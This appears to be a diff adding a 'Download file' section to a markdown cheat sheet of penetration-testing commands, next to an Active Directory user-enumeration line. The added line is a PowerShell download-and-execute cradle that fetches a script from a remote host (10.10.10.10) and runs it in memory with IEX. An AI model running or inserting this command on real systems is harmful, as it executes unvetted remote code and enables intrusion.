@@ -1,3 +1,8 @@
+## Download file:
+```
+C:\Windows\system32> powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:80/file.ps1')"
+```
+
 ## Active-Directory
 ```
 Get-ADUser EXAMEUSERNAME -Properties *
